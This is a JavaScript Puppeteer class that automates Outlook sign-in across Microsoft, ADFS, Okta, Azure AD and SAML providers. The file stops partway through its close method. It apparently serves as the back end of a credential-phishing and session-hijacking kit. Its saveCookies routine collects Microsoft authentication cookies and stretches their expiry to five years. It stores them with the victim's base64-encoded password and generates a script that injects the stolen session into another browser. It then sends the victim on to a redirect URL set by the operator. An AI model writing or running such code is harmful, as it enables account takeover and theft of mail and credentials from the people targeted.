const puppeteer = require('puppeteer');

class OutlookLoginAutomation {
    constructor(options = {}) {
        this.browser = null;
        this.page = null;
        this.context = null;
        this.enableScreenshots = options.enableScreenshots !== false; // Enable screenshots by default
        this.screenshotQuality = options.screenshotQuality || 80; // Compress screenshots for faster I/O
        this.isClosing = false; // Prevent double-close operations
        this.lastActivity = Date.now(); // Track last activity for timeout management
    }

    async init() {

        // Private browser launch with minimal args for stability
        const browserOptions = {
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-first-run',
                '--disable-extensions',
                '--disable-infobars',
                '--disable-notifications',
                '--disable-default-apps',
                '--disable-background-networking',
                '--disable-sync',
                '--no-default-browser-check',
                '--disable-popup-blocking',
                '--disable-translate'
            ],
            // More stable options for cloud environments
            dumpio: false,
            ignoreHTTPSErrors: true,
            defaultViewport: null
        };

        // Try to find Chromium dynamically for different hosting environments
        try {
            const fs = require('fs');
            const { execSync } = require('child_process');
            const path = require('path');

            // Priority 0: Check for environment variable overrides first (for Render deployment)
            if (process.env.CHROMIUM_PATH) {
                if (fs.existsSync(process.env.CHROMIUM_PATH)) {
                    browserOptions.executablePath = process.env.CHROMIUM_PATH;
                    console.log(`Using environment Chromium path: ${process.env.CHROMIUM_PATH}`);
                } else {
                    console.warn(`CHROMIUM_PATH environment variable set but path does not exist: ${process.env.CHROMIUM_PATH}`);
                }
            } else if (process.env.PUPPETEER_EXECUTABLE_PATH) {
                // Handle glob patterns in PUPPETEER_EXECUTABLE_PATH for Render
                const execPath = process.env.PUPPETEER_EXECUTABLE_PATH;
                if (execPath.includes('*')) {
                    try {
                        const globCommand = `ls -d ${execPath} 2>/dev/null | head -1`;
                        const foundPath = execSync(globCommand, { encoding: 'utf8' }).trim();
                        if (foundPath && fs.existsSync(foundPath)) {
                            browserOptions.executablePath = foundPath;
                            console.log(`Using expanded PUPPETEER_EXECUTABLE_PATH: ${foundPath}`);
                        } else {
                            console.log(`No Chrome found at glob pattern: ${execPath}`);
                        }
                    } catch (e) {
                        console.warn(`Failed to expand PUPPETEER_EXECUTABLE_PATH glob: ${execPath}`);
                    }
                } else if (fs.existsSync(execPath)) {
                    browserOptions.executablePath = execPath;
                    console.log(`Using PUPPETEER_EXECUTABLE_PATH: ${execPath}`);
                }
            }

            // Priority 1: Use system chromium first (better Nix dependencies) - only if no env override
            if (!browserOptions.executablePath) {
                try {
                    const chromiumPath = execSync('which chromium', { encoding: 'utf8' }).trim();
                    if (chromiumPath && fs.existsSync(chromiumPath)) {
                        browserOptions.executablePath = chromiumPath;
                        console.log(`Using system Chromium path: ${chromiumPath}`);
                    }
                } catch (e) {
                    console.log('System chromium not available, trying other methods...');
                }
            }

            // Fallback: try to use Puppeteer's installed Chrome (for Render and other platforms)
            if (!browserOptions.executablePath) {
                try {
                    const puppeteer = require('puppeteer');
                    if (puppeteer.executablePath) {
                        const puppeteerChrome = puppeteer.executablePath();
                        if (fs.existsSync(puppeteerChrome)) {
                            browserOptions.executablePath = puppeteerChrome;
                            console.log(`Using Puppeteer's Chrome: ${puppeteerChrome}`);
                        }
                    }
                } catch (e) {
                    console.log('Puppeteer executablePath not available, continuing...');
                }
            }

            // If still not found, try common paths including Render cache
            if (!browserOptions.executablePath) {
                const commonPaths = [
                    // Render Puppeteer cache paths
                    '/opt/render/.cache/puppeteer/chrome/*/chrome-linux64/chrome',
                    '/opt/render/.cache/puppeteer/chrome/linux-*/chrome-linux64/chrome',
                    // Nix store paths (Replit)
                    '/nix/store/*/bin/chromium',
                    // Standard Linux paths
                    '/usr/bin/chromium',
                    '/usr/bin/chromium-browser',
                    '/usr/bin/google-chrome',
                    '/usr/bin/google-chrome-stable'
                ];

                for (const pathPattern of commonPaths) {
                    try {
                        if (pathPattern.includes('*')) {
                            // Handle glob patterns for different environments
                            let globCommand;
                            if (pathPattern.includes('/opt/render/.cache/puppeteer/chrome/')) {
                                // Render Puppeteer cache
                                globCommand = `ls -d ${pathPattern} 2>/dev/null || true`;
                            } else if (pathPattern.includes('/nix/store/')) {
                                // Nix store (Replit)
                                globCommand = `ls -d /nix/store/*chromium*/bin/chromium 2>/dev/null || true`;
                            }

                            if (globCommand) {
                                const foundPaths = execSync(globCommand, { encoding: 'utf8' }).trim().split('\n').filter(p => p);
                                if (foundPaths.length > 0 && fs.existsSync(foundPaths[0])) {
                                    browserOptions.executablePath = foundPaths[0];
                                    console.log(`Using glob-found Chromium: ${foundPaths[0]}`);
                                    break;
                                }
                            }
                        } else if (fs.existsSync(pathPattern)) {
                            browserOptions.executablePath = pathPattern;
                            console.log(`Using system Chromium: ${pathPattern}`);
                            break;
                        }
                    } catch (pathError) {
                        continue;
                    }
                }
            }

            // If no custom path found, let Puppeteer use its bundled Chromium
            if (!browserOptions.executablePath) {
                console.log('Using Puppeteer default Chromium (bundled)');
            }

        } catch (error) {
            console.warn('Could not detect Chromium path, using Puppeteer default:', error.message);
        }

        // Debug browser environment first
        console.log('Puppeteer version:', require('puppeteer').version || 'unknown');
        console.log('Available browser options:', browserOptions);

        // Launch browser with retries and better error handling
        let retries = 3;
        while (retries > 0) {
            try {
                console.log(`Attempting to launch browser (attempt ${4-retries}/3)...`);
                this.browser = await puppeteer.launch(browserOptions);
                console.log('Browser launched successfully');

                // Create incognito browser context for complete session isolation
                this.context = await this.browser.createBrowserContext();
                console.log('Created private browser context for session isolation');

                // Wait a moment for browser to stabilize
                await new Promise(resolve => setTimeout(resolve, 1000));
                break;
            } catch (error) {
                retries--;
                console.warn(`Browser launch attempt failed (${4-retries}/3):`, error.message);
                if (retries === 0) {
                    throw new Error(`Failed to launch browser after 3 attempts: ${error.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 3000)); // Wait 3 seconds before retry
            }
        }

        // Create new page with error handling and debugging
        try {
            console.log('Creating new page...');
            const pages = await this.browser.pages(); // Get existing pages first
            console.log(`Browser has ${pages.length} existing pages`);

            this.page = await this.context.newPage();
            console.log('New page created in private context successfully');

            // Set viewport and user agent
            await this.page.setViewport({ width: 1280, height: 720 });
            await this.page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');

            // Set up error handling for the page to prevent memory leaks
            this.page.on('error', (error) => {
                console.error('Page error:', error);
            });

            this.page.on('pageerror', (error) => {
                console.error('Page JavaScript error:', error);
            });

            console.log('Browser initialized successfully');
        } catch (error) {
            console.error('Failed to create new page, error details:', error);
            if (this.browser) {
                try {
                    console.log('Attempting to close browser after page creation failure...');
                    await this.browser.close();
                } catch (closeError) {
                    // Only log non-protocol errors to avoid noise
                    if (!closeError.message.includes('Target.closeTarget') && !closeError.message.includes('No target with given id')) {
                        console.error('Error closing browser after page creation failure:', closeError);
                    }
                }
            }
            this.browser = null;
            this.page = null;
            throw new Error(`Failed to create new page: ${error.message}`);
        }
    }

    async navigateToOutlook() {
        try {
            console.log('Navigating to Outlook...');
            await this.page.goto('https://outlook.office.com/mail/', {
                waitUntil: 'domcontentloaded'
            });

            console.log('Successfully navigated to Outlook');

            // Reduced wait time for faster performance
            await new Promise(resolve => setTimeout(resolve, 1000));

            return true;
        } catch (error) {
            console.error('Error navigating to Outlook:', error.message);
            return false;
        }
    }

    async performLogin(email, password) {
        try {
            console.log(`Attempting to login with email: ${email}`);

            // Wait for email input field
            await this.page.waitForSelector('input[type="email"]');

            // Enter email
            await this.page.type('input[type="email"]', email);
            console.log('Email entered');

            // Click Next button
            await this.page.click('input[type="submit"]');
            console.log('Clicked Next button');

            // Wait for page to respond and detect any redirects (reduced wait time)
            await new Promise(resolve => setTimeout(resolve, 1500));

            // Check if we've been redirected to a corporate login provider
            const currentUrl = this.page.url();
            console.log(`Current URL after email submission: ${currentUrl}`);

            const loginProvider = await this.detectLoginProvider();
            console.log(`Detected login provider: ${loginProvider}`);

            // Handle login based on the provider
            let loginSuccess = false;

            if (loginProvider === 'microsoft') {
                loginSuccess = await this.handleMicrosoftLogin(password);
            } else if (loginProvider === 'adfs') {
                loginSuccess = await this.handleADFSLogin(password);
            } else if (loginProvider === 'okta') {
                loginSuccess = await this.handleOktaLogin(password);
            } else if (loginProvider === 'azure-ad') {
                loginSuccess = await this.handleAzureADLogin(password);
            } else if (loginProvider === 'generic-saml') {
                loginSuccess = await this.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider detected. Attempting generic login...`);
                loginSuccess = await this.handleGenericLogin(password);
            }

            if (!loginSuccess) {
                console.error('Password authentication failed - incorrect credentials provided');
                await this.takeScreenshot(`screenshots/login-failed-${Date.now()}.png`);
                return false;
            }

            // Wait for possible "Stay signed in?" prompt
            await this.handleStaySignedInPrompt();

            // Final redirect check - wait for Outlook to load (reduced timing)
            await new Promise(resolve => setTimeout(resolve, 2500));

            const finalUrl = this.page.url();
            if (finalUrl.includes('outlook.office.com/mail')) {
                console.log('Login successful - redirected to Outlook mail');

                // Save session cookies after successful login
                await this.saveCookies();

                return true;
            }

            console.error('Login process completed but did not redirect to Outlook mail - authentication may have failed');
            await this.takeScreenshot(`screenshots/no-redirect-${Date.now()}.png`);
            return false;
        } catch (error) {
            console.error('Error during login:', error.message);
            return false;
        }
    }

    async detectLoginProvider() {
        try {
            const currentUrl = this.page.url();
            console.log(`Analyzing URL for login provider: ${currentUrl}`);

            // Check URL patterns to identify the login provider
            if (currentUrl.includes('login.microsoftonline.com') || currentUrl.includes('login.live.com')) {
                return 'microsoft';
            } else if (currentUrl.includes('adfs') || currentUrl.includes('sts') || currentUrl.includes('fs.')) {
                return 'adfs';
            } else if (currentUrl.includes('okta.com') || currentUrl.includes('.okta.')) {
                return 'okta';
            } else if (currentUrl.includes('microsoftonline.com') && !currentUrl.includes('login.microsoftonline.com')) {
                return 'azure-ad';
            }

            // Check page content for additional clues
            const pageText = await this.page.evaluate(() => document.body.textContent || '');
            const pageTitle = await this.page.title();

            if (pageTitle.toLowerCase().includes('adfs') || pageText.toLowerCase().includes('active directory')) {
                return 'adfs';
            } else if (pageTitle.toLowerCase().includes('okta') || pageText.toLowerCase().includes('okta')) {
                return 'okta';
            } else if (pageText.toLowerCase().includes('saml') || pageText.toLowerCase().includes('single sign')) {
                return 'generic-saml';
            }

            // Default to Microsoft if no specific provider detected but we're still on a Microsoft domain
            if (currentUrl.includes('microsoft') || currentUrl.includes('office')) {
                return 'microsoft';
            }

            return 'unknown';

        } catch (error) {
            console.error('Error detecting login provider:', error.message);
            return 'unknown';
        }
    }

    async handleMicrosoftLogin(password) {
        try {
            console.log('Handling Microsoft standard login...');

            // Wait for password field
            await this.page.waitForSelector('input[type="password"]');

            // Enter password
            await this.page.type('input[type="password"]', password);
            console.log('Password entered for Microsoft login');

            // Click Sign in button
            await this.page.click('input[type="submit"]');
            console.log('Clicked Sign in button for Microsoft login');

            // Wait for possible responses (optimized timing)
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Check for error messages after password submission
            const errorSelectors = [
                '[data-bind*="errorText"]',
                '.alert-error',
                '.error-message',
                '[role="alert"]',
                '.ms-TextField-errorMessage',
                '.field-validation-error'
            ];

            let errorMessage = null;
            for (const selector of errorSelectors) {
                try {
                    const errorElement = await this.page.$(selector);
                    if (errorElement) {
                        const text = await this.page.evaluate(el => el.textContent, errorElement);
                        if (text && text.trim()) {
                            errorMessage = text.trim();
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }

            // Also check for common error text patterns on the page
            const pageText = await this.page.evaluate(() => document.body.textContent || '');
            const errorPatterns = [
                'Your account or password is incorrect',
                'password is incorrect',
                'Sign-in was unsuccessful',
                'The username or password is incorrect',
                'Invalid credentials',
                'Authentication failed'
            ];

            for (const pattern of errorPatterns) {
                if (pageText.toLowerCase().includes(pattern.toLowerCase())) {
                    errorMessage = pattern;
                    break;
                }
            }

            if (errorMessage) {
                console.error(`Microsoft login failed: ${errorMessage}`);
                await this.takeScreenshot(`screenshots/error-microsoft-login-${Date.now()}.png`);
                return false;
            }

            return true;

        } catch (error) {
            console.error('Error in Microsoft login:', error.message);
            return false;
        }
    }

    async handleADFSLogin(password) {
        try {
            console.log('Handling ADFS login...');

            // ADFS often uses different selectors
            const passwordSelectors = [
                'input[type="password"]',
                'input[name="Password"]',
                'input[name="password"]',
                '#passwordInput',
                '.password-input'
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    await this.page.waitForSelector(selector);
                    passwordField = selector;
                    break;
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find password field for ADFS login');
                return false;
            }

            // Enter password
            await this.page.type(passwordField, password);
            console.log('Password entered for ADFS login');

            // ADFS login button selectors
            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                '#submitButton',
                '.submit-button',
                'input[value*="Sign"]',
                'button:contains("Sign in")',
                'button:contains("Login")'
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log(`Clicked ADFS submit button: ${selector}`);
                        submitted = true;
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                console.warn('Could not find submit button for ADFS, trying Enter key...');
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
            return true;

        } catch (error) {
            console.error('Error in ADFS login:', error.message);
            return false;
        }
    }

    async handleOktaLogin(password) {
        try {
            console.log('Handling Okta login...');

            // Okta specific selectors
            const passwordSelectors = [
                'input[name="password"]',
                'input[type="password"]',
                '.okta-form-input-field input[type="password"]',
                '#okta-signin-password'
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    await this.page.waitForSelector(selector);
                    passwordField = selector;
                    break;
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find password field for Okta login');
                return false;
            }

            // Enter password
            await this.page.type(passwordField, password);
            console.log('Password entered for Okta login');

            // Okta submit button selectors
            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                '.okta-form-submit-btn',
                '#okta-signin-submit',
                'button[data-type="save"]'
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log(`Clicked Okta submit button: ${selector}`);
                        submitted = true;
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                console.warn('Could not find submit button for Okta, trying Enter key...');
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
            return true;

        } catch (error) {
            console.error('Error in Okta login:', error.message);
            return false;
        }
    }

    async handleAzureADLogin(password) {
        try {
            console.log('Handling Azure AD login...');

            // Azure AD specific selectors (similar to Microsoft but may have custom themes)
            const passwordSelectors = [
                'input[type="password"]',
                'input[name="passwd"]',
                'input[name="password"]',
                '[data-testid="i0118"]' // Azure AD password field
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    await this.page.waitForSelector(selector);
                    passwordField = selector;
                    break;
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find password field for Azure AD login');
                return false;
            }

            // Enter password
            await this.page.type(passwordField, password);
            console.log('Password entered for Azure AD login');

            // Azure AD submit selectors
            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                '[data-testid="submitButton"]',
                '#idSIButton9' // Common Azure AD submit button
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log(`Clicked Azure AD submit button: ${selector}`);
                        submitted = true;
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                console.warn('Could not find submit button for Azure AD, trying Enter key...');
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
            return true;

        } catch (error) {
            console.error('Error in Azure AD login:', error.message);
            return false;
        }
    }

    async handleGenericSAMLLogin(password) {
        try {
            console.log('Handling Generic SAML login...');

            // Generic SAML password selectors
            const passwordSelectors = [
                'input[type="password"]',
                'input[name="password"]',
                'input[name="Password"]',
                'input[name="passwd"]',
                '.password',
                '#password'
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    await this.page.waitForSelector(selector);
                    passwordField = selector;
                    break;
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find password field for Generic SAML login');
                return false;
            }

            // Enter password
            await this.page.type(passwordField, password);
            console.log('Password entered for Generic SAML login');

            // Generic submit selectors
            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                'button:contains("Sign in")',
                'button:contains("Login")',
                'input[value*="Sign"]',
                'input[value*="Login"]',
                '.submit',
                '#submit'
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        console.log(`Clicked Generic SAML submit button: ${selector}`);
                        submitted = true;
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                console.warn('Could not find submit button for Generic SAML, trying Enter key...');
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 2000));
            return true;

        } catch (error) {
            console.error('Error in Generic SAML login:', error.message);
            return false;
        }
    }

    async handleGenericLogin(password) {
        try {
            console.log('Handling unknown/generic login provider...');

            // Try the most common password field selectors
            const passwordSelectors = [
                'input[type="password"]',
                'input[name="password"]',
                'input[name="Password"]',
                'input[name="passwd"]',
                'input[name="pwd"]',
                '.password',
                '#password',
                '#Password',
                '[placeholder*="password" i]'
            ];

            let passwordField = null;
            for (const selector of passwordSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        // Check if field is visible and enabled
                        const isVisible = await this.page.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            return rect.width > 0 && rect.height > 0 && el.offsetParent !== null;
                        }, element);

                        if (isVisible) {
                            passwordField = selector;
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!passwordField) {
                console.error('Could not find any password field for generic login');
                await this.takeScreenshot(`screenshots/debug-no-password-field-${Date.now()}.png`);
                return false;
            }

            console.log(`Found password field with selector: ${passwordField}`);

            // Enter password
            await this.page.type(passwordField, password);
            console.log('Password entered for generic login');

            // Try the most common submit selectors
            const submitSelectors = [
                'input[type="submit"]',
                'button[type="submit"]',
                'button:contains("Sign in")',
                'button:contains("Login")',
                'button:contains("Submit")',
                'input[value*="Sign" i]',
                'input[value*="Login" i]',
                'input[value*="Submit" i]',
                '.submit',
                '#submit',
                '.login-button',
                '#login-button'
            ];

            let submitted = false;
            for (const selector of submitSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        // Check if button is visible and enabled
                        const isClickable = await this.page.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            return rect.width > 0 && rect.height > 0 &&
                                   el.offsetParent !== null && !el.disabled;
                        }, element);

                        if (isClickable) {
                            await element.click();
                            console.log(`Clicked generic submit button: ${selector}`);
                            submitted = true;
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }

            if (!submitted) {
                console.warn('Could not find submit button, trying Enter key on password field...');
                await this.page.focus(passwordField);
                await this.page.keyboard.press('Enter');
            }

            await new Promise(resolve => setTimeout(resolve, 2000));
            return true;

        } catch (error) {
            console.error('Error in generic login:', error.message);
            await this.takeScreenshot(`screenshots/debug-generic-login-error-${Date.now()}.png`);
            return false;
        }
    }

    async handleStaySignedInPrompt() {
        try {
            console.log('Checking for "Stay signed in?" prompt...');

            // Look for various possible selectors for the "Stay signed in" prompt
            const staySignedInSelectors = [
                'input[type="submit"][value*="Yes"]',
                'button[type="submit"][data-report-event*="Signin_Submit_Yes"]',
                'input[value="Yes"]',
                'button:contains("Yes")',
                '[data-testid="kmsi-yes-button"]',
                '#idSIButton9' // Common Microsoft login button ID for "Yes"
            ];

            // Check if the prompt exists
            let foundPrompt = false;
            for (let selector of staySignedInSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        console.log(`Found "Stay signed in?" prompt with selector: ${selector}`);

                        // Check if this is actually the "Yes" button by looking at surrounding text
                        const pageText = await this.page.evaluate(() => document.body.textContent);
                        if (pageText.includes('Stay signed in') || pageText.includes('Don\'t show this again')) {
                            console.log('Confirmed this is the "Stay signed in?" page');

                            // Click "Yes" to stay signed in
                            await element.click();
                            console.log('✅ Clicked "Yes" to stay signed in');

                            // Wait for the page to process the selection
                            await new Promise(resolve => setTimeout(resolve, 3000));

                            foundPrompt = true;
                            break;
                        }
                    }
                } catch (e) {
                    // Continue to next selector if this one fails
                    continue;
                }
            }

            if (!foundPrompt) {
                console.log('No "Stay signed in?" prompt found - proceeding normally');
            }

        } catch (error) {
            console.error('Error handling stay signed in prompt:', error.message);
            // Don't throw error, just continue with login process
        }
    }

    async saveCookies(email = null, password = null) {
        try {
            console.log('🍪 Saving enhanced persistent session cookies...');

            // Extended list of Microsoft authentication domains
            const domains = [
                'https://login.microsoftonline.com',
                'https://login.live.com',
                'https://outlook.office.com',
                'https://outlook.office365.com',
                'https://www.office.com',
                'https://account.microsoft.com',
                'https://graph.microsoft.com',
                'https://aadcdn.msftauth.net',
                'https://aadcdn.msauth.net'
            ];

            let allCookies = [];

            // Collect cookies from current page first
            const currentCookies = await this.page.cookies();
            allCookies = allCookies.concat(currentCookies);

            // Visit each Microsoft domain to collect all auth cookies
            for (const domain of domains) {
                try {
                    console.log(`🌐 Collecting cookies from: ${domain}`);
                    await this.page.goto(domain, {
                        waitUntil: 'domcontentloaded',
                        timeout: 8000
                    });
                    const domainCookies = await this.page.cookies();
                    allCookies = allCookies.concat(domainCookies);
                    console.log(`✅ Collected ${domainCookies.length} cookies from ${domain}`);
                } catch (e) {
                    console.log(`⚠️ Could not access ${domain}: ${e.message}`);
                }
            }

            // Filter for essential authentication cookies only
            const essentialCookieNames = [
                // Core Microsoft authentication (CRITICAL)
                'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid',

                // Outlook specific (REQUIRED)
                'luat', 'SuiteServiceProxyKey', 'OWAAppIdType',

                // Session management (MINIMAL)
                'fpc', 'stsservicecookie', 'x-ms-gateway-slice'
            ];

            // Remove duplicates and filter for essential cookies only
            const uniqueCookies = [];
            const seen = new Set();
            const cookieMap = new Map();

            // First pass: collect all cookies and identify the best version of each
            for (const cookie of allCookies) {
                const isEssential = essentialCookieNames.includes(cookie.name) ||
                                  cookie.name.startsWith('esctx-');

                if (isEssential) {
                    const cookieKey = `${cookie.name}|${cookie.domain}`;

                    // If we haven't seen this cookie name+domain combo, or if this one has a longer expiry, use it
                    if (!cookieMap.has(cookieKey) ||
                        (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
                        cookieMap.set(cookieKey, cookie);
                    }
                }
            }

            // Second pass: process the unique cookies
            for (const [key, cookie] of cookieMap) {
                // Force all cookies to be persistent with extended expiry
                if (cookie.expires === -1 || !cookie.expires || cookie.session) {
                    // Set expiry to 5 years from now for maximum persistence
                    cookie.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    cookie.session = false;
                } else {
                    // Extend existing expiry to 5 years if it's shorter
                    const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    if (cookie.expires < fiveYearsFromNow) {
                        cookie.expires = fiveYearsFromNow;
                    }
                }

                // Ensure secure transmission
                cookie.secure = true;
                cookie.sameSite = 'None';

                uniqueCookies.push(cookie);
            }

            console.log(`📦 Optimized to ${uniqueCookies.length} essential authentication cookies (removed ${allCookies.length - uniqueCookies.length} unnecessary cookies)`);

            // Create session data directory
            const fs = require('fs');
            const path = require('path');
            const sessionDir = 'session_data';

            if (!fs.existsSync(sessionDir)) {
                fs.mkdirSync(sessionDir, { recursive: true });
            }

            // Create session file with all cookies in one place
            const sessionId = Date.now();
            const sessionTimestamp = new Date().toISOString();
            const sessionEmail = email || 'unknown';
            const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
            const sessionFilePath = path.join(sessionDir, sessionFileName);

            console.log(`📄 Creating single session file: ${sessionFileName}`);

            // Create comprehensive session data with all cookies in one file
            const sessionData = {
                id: sessionId,
                timestamp: sessionTimestamp,
                email: sessionEmail,
                password: password ? Buffer.from(password).toString('base64') : null,
                totalCookies: uniqueCookies.length,
                domains: domains,
                cookies: uniqueCookies,
                userAgent: await this.page.evaluate(() => navigator.userAgent),
                browserFingerprint: {
                    viewport: await this.page.viewport(),
                    timezone: await this.page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
                    language: await this.page.evaluate(() => navigator.language)
                }
            };

            fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
            console.log(`💾 Session saved with ${uniqueCookies.length} cookies in single file`);

            // Create injection script for this session
            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
            const sessionScriptContent = `
// Session Cookie Injector
// Auto-generated on ${sessionTimestamp}
// Session: ${sessionEmail} (${uniqueCookies.length} cookies)

(function() {
    console.log('🚀 Injecting ${uniqueCookies.length} cookies for session: ${sessionEmail}');

    const sessionInfo = {
        email: '${sessionEmail}',
        timestamp: '${sessionTimestamp}',
        cookieCount: ${uniqueCookies.length}
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${sessionEmail}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();`;

            fs.writeFileSync(sessionInjectScript, sessionScriptContent);
            console.log(`🔧 Injection script created: ${sessionInjectScript}`);

            console.log(`✅ Session saved with ${uniqueCookies.length} cookies in single file`);
            console.log(`📄 Session file: ${sessionFilePath}`);
            if (email) console.log(`📧 Email captured: ${email}`);
            if (password) console.log(`🔑 Password captured and encoded for future use`);

            // Get configurable redirect URL from server
            let redirectUrl = 'https://office.com'; // Default fallback
            try {
                const response = await fetch('http://localhost:5000/api/internal/redirect-url');
                const data = await response.json();
                if (data.success && data.redirectUrl) {
                    redirectUrl = data.redirectUrl;
                }
            } catch (error) {
                console.warn('Could not fetch redirect config, using default:', error.message);
            }

            // Redirect to configured destination after successful cookie save
            console.log(`🔄 Redirecting to ${redirectUrl}...`);
            await this.page.goto(redirectUrl, {
                waitUntil: 'networkidle2',
                timeout: 30000
            });
            console.log(`✅ Redirected to ${redirectUrl} successfully`);

            return sessionFilePath;

        } catch (error) {
            console.error('❌ Error saving enhanced session:', error.message);
            return null;
        }
    }

    async checkEmails() {
        try {
            console.log('Checking for emails...');

            // Wait for email list to load
            await this.page.waitForSelector('[role="listbox"]', { timeout: 15000 });

            // Get email count
            const emails = await this.page.$$('[role="listbox"] [role="option"]');
            console.log(`Found ${emails.length} emails in inbox`);

            // Extract email subjects from first few emails
            const emailSubjects = [];
            for (let i = 0; i < Math.min(5, emails.length); i++) {
                try {
                    const subject = await emails[i].$eval('[data-testid="message-subject"]', el => el.textContent);
                    emailSubjects.push(subject);
                } catch (e) {
                    // If subject extraction fails, skip
                    continue;
                }
            }

            console.log('Recent email subjects:', emailSubjects);
            return emailSubjects;

        } catch (error) {
            console.error('Error checking emails:', error.message);
            return [];
        }
    }

    async takeScreenshot(filename = 'screenshots/outlook-screenshot.png') {
        if (!this.enableScreenshots) {
            console.log(`Screenshot skipped (disabled): ${filename}`);
            return;
        }

        try {
            // Create screenshots directory if it doesn't exist
            const fs = require('fs');
            const path = require('path');
            const screenshotDir = path.dirname(filename);

            if (!fs.existsSync(screenshotDir)) {
                fs.mkdirSync(screenshotDir, { recursive: true });
                console.log(`Created screenshot directory: ${screenshotDir}`);
            }

            await this.page.screenshot({
                path: filename,
                quality: this.screenshotQuality,
                type: 'jpeg', // Use JPEG for smaller file sizes
                fullPage: false // Faster than full page screenshots
            });
            console.log(`Screenshot saved as ${filename}`);
        } catch (error) {
            console.error('Error taking screenshot:', error.message);
        }
    }

    async close() {
        // Prevent concurrent close operations
        if (this.isClosing) {
            console.log('Close operation already in progress');
            return;
        }

        this.isClosing = true;

        // Close entire browser - no pool
        if (this.browser) {
            try {
                // Get browser process reference before closing
                const browserProcess = this.browser.process();
                
                // Check if browser is still connected
                const isConnected = this.browser.isConnected();

                if (isConnected) {
                    // First close all pages to prevent hanging processes
                    if (this.page && !this.page.isClosed()) {
                        try {
                            // Remove all listeners to prevent memory leaks
                            this.page.removeAllListeners();
                            await Promise.race([
                                this.page.close(),
                                new Promise((_, reject) => setTimeout(() => reject(new Error('Page close timeout')), 3000))
                            ]);
                        } catch (pageError) {
                            console.log('Page close failed, will force kill browser process');
                        }
                    }

                    // Close all other pages that might exist
                    try {
                        const pages = await Promise.race([
                            this.browser.pages(),
                            new Promise((_, reject) => setTimeout(() => reject(new Error('Pages fetch timeout')), 2000))
                        ]);
                        
                        for (const page of pages) {
                            if (!page.isClosed()) {
                                try {
                                    page.removeAllListeners();
